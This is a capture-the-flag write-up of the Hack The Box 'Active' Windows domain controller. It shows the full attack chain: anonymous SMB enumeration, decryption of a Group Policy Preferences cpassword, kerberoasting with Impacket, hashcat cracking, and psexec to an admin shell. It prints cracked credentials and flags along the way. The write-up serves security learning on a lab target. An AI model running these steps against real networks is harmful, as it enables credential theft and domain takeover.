---
machineName: Active
difficulty: Easy
Status: Done
OS: Windows
start_time: 2026-05-15T15:30:00
end_time: 2026-05-15T17:50:00
player_position: "32616"
CVEs:
CWEs:
tools:
  - nmap
  - ffuf
  - ZAP
exploited_programs:
  - SMB
  - Kerberos
open_ports:
  - "53"
  - "88"
  - "135"
  - "139"
  - "389"
  - "445"
  - "464"
  - "593"
  - "636"
aliases:
  - Find cpassword in SMB, crack it and perform kerberoasting
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5837ac5e28291146a9f2a8a015540c28.png
---
<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5837ac5e28291146a9f2a8a015540c28.png"
    width="200"
  >
</div>

# First Enumeration

```shell
➜  Active [I] : nmap -sC -sV -T4 10.129.33.200                                                                                        [15/05/26 | 3:27:29]
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 15:27 +0200
Nmap scan report for 10.129.33.200
Host is up (0.017s latency).
Not shown: 983 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-15 13:27:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-05-15T13:28:44
|_  start_date: 2026-05-15T13:21:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

We see ports **139** and **445** are open, we can suspect there is an **SMB** share running.

We try to list shares, and see that anonymous login is enabled 

```shell
➜  Active [I] : smbclient -L //10.129.33.200/                                                   
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\drope]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Replication     Disk
	SYSVOL          Disk      Logon server share
	Users           Disk

```

We see that the only share we have access to is the `REPLICATION` share, when taking a peek inside we only found these policies:

```
➜  Active [I] : smbclient //10.129.33.200/REPLICATION -N                                                                              [15/05/26 | 3:46:08]
Can't load /etc/samba/smb.conf - run testparm to debug it
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018

		5217023 blocks of size 4096. 284719 blocks available
smb: \> tree
tree: command not found
smb: \> ls active.htb\
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 12:37:44 2018
  Policies                            D        0  Sat Jul 21 12:37:44 2018
  scripts                             D        0  Wed Jul 18 20:48:57 2018

		5217023 blocks of size 4096. 284719 blocks available
smb: \> ls active.htb\Policies\
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 12:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 12:37:44 2018

		5217023 blocks of size 4096. 284719 blocks available
smb: \>
```

We See some interesting files in such Policies:

in the {31B2…} we find:

```shell
➜  Active [I] : cat 'MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'                                                                [15/05/26 | 3:56:25]
��[Unicode]
Unicode=yes
[System Access]
MinimumPasswordAge = 1
MaximumPasswordAge = 42
MinimumPasswordLength = 7
PasswordComplexity = 1
PasswordHistorySize = 24
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
[Version]
signature="$CHICAGO$"
Revision=1
➜  Active [I] : cat 'MACHINE\Preferences\Groups\Groups.xml'                                                                           [15/05/26 | 3:56:35]
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

and in the {6AC1…} I found the following stuff:

```shell
➜  Active [I] : cat Outputs/6A/*                                                                                                      [15/05/26 | 3:57:17]
[General]
Version=1
��[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
SeAuditPrivilege = *S-1-5-20,*S-1-5-19
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
SeInteractiveLogonRight = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
[Version]
signature="$CHICAGO$"
Revision=1
```

After properly understanding what these configs meant, I attempted to crack the password, I first attempted with hashcat but after a bit of research I found **gpp-decrypt** which actually decrypted it instantly:

```
➜  Active [I] : gpp-decrypt -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                 [15/05/26 | 4:05:42]

                               __                                __
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/
/___/  /_/    /_/                                /___/  /_/

[ * ] Password: GPPstillStandingStrong2k18
```

Seems like microsoft encrypted cpasswords with AES, but published the encryption key documentation, absolutely genius.

psexec gave no results: 
```
➜  Active [I] : psexec.py active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.129.33.200                                                 [15/05/26 | 4:15:23]
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.33.200.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.

```

Maybe we can move on to other stuff:

```
➜  Active [I] : GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.33.200 -request                            [15/05/26 | 4:25:13]
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2026-05-15 15:22:23.562537      



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d6848a515bd037baf3d48f533bac25d1$29f3fd33ec7d419caaca5fbe63679e20aadcef2dcdda4db19f508616485529e1d02cb3a2b1b4e5e0804932b817dfd018e26e5102574e68973e2eb0e176e00053e994fb78b28f2ff6f704732a9b23281cae816322d6e6e4d7312e412a8d64a8f2c0a565ae8de6e316146166afcfa4edfba71822c05c7762912290b9b3649b0dcba89a659902170b933a0f5048370065b8fd049e83ddae22ae0b5a5551c82253bcc1143fd3dbdf1e807e44f10ba37eac123f5f4028924a4ef0c0b67d4b44aa04445111beaa1b55220431967956d38573889a2c811c940647d57923822415c21dee4e60e319973582450f7bcfe1384c5999b2a0815bab132b9e7dbb03ec005e7406031a148292972238a0112e17c8b74c1a3856b6baffbb8f759c999c97217399267bb5dfc7ad634d696357cd116e63b47817a6a02e74418b555eb9fd174d46e71c91be653b41443b9819a198b556db3d20fdc60bbbcf1a27e0e4258cc1a19aaebcbd57a8d8eb44a5a2f295fba80357537b87390aae722ef3e2192a4304244524aff95c470a50bef93edb2a4e7e351f706ad5e9e4f0c2a594bc9d3eda1c5dac66bb8efc72a61c3322abff5ac76acca6120b8223956055fbc45bad125e8f980d25ad8725fa93e2cbb7ccb573ba994b5e9464ceda0d6a8a578fb62679ef13e3eabdaf248bee07a212d94f58ca85575162533c38d4504353b65f44e197f409bd39d153017b2b2c76ca95bb455283adb2456218301b5c959e757cb6bd5375d54ea57feb11ee149b2b4bf5608d9c900be8bf4752f3b79ab5652977bc2ae99b99d660f3c929e6f58811bd27ada1a15dadc860064a23db1c2f85279dcb70cbc545dbb12996faace993a3982baebaaf684b6fe4abaf1c56c81fc9cc7ccd8e6fc38deacde22f3b0412324aa1c138c34c78d5653e181fdfdd401d86c196349cd02925a0d6f7e7da6d9a3d0f616821e4386cc69f67593525ebb5fb242d66b9b14f008dc3226afb5c3ad3eeda6191545bca1256e65b4aea65b6b4d4eb590293a3c4a1a65a0e7d258a40349f842154889b157145bea990bcd87ad68112ee715a8b6976b9c24d73d8085ec1a0df198fc7678946488bfb42e764675ccb2b13bd3c02b440408eb6e5fae504f60b573b08a72ccfa0867d9076caddd989c7b62936f7089b1aa94e091e04f3ad3f36935d6c7e17cf6414eaca3273152d8ca23569b0690ae2586c0c7e92e6720812f8b917f08cc7bd5c6dbc9b814e345da9029cc9f047bbc9
```

We send that through hashcat:

```
hashcat -m 13100 hash.txt ~/Applications/rockyou.txt
```

and get the following password: 

`Ticketmaster1968`

Now we attempt to use Psexec again:


We land in an admin shell and get the flags easily: 

```
C:\Windows\system32> type \Users\SVC_TGS\Desktop\user.txt
79a53d3fcd120055da8a797640188f0d

C:\Windows\system32> type \Users\Administrator\Desktop\root.txt
420c4703730f180ecc5b8f67a60961ad
```

```
psexec.py -dc-ip 10.129.33.200 active.htb/Administrator:Ticketmaster1968@10.129.33.200 
```
